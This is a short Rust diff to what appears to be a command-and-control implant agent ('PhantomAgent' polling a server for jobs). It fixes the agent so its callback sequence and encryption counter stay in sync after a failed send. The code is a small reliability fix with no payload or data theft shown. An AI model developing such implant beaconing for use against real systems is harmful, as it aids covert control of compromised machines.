@@ -42,9 +42,14 @@ impl PhantomAgent {
             &[],
         )?;
 
-        let response = self.transport.send(&packet).await?;
+        let result = self.transport.send(&packet).await;
+
+        // Always advance seq and request-side CTR — the server consumes both
+        // before sending a response, so skipping on transport failure desyncs.
         self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandGetJob), 0);
         self.callback_seq += 1;
+
+        let response = result?;
 
         let (packages, next_offset) =
             parse_job_response(&self.session_crypto, self.ctr_offset, &response)?;
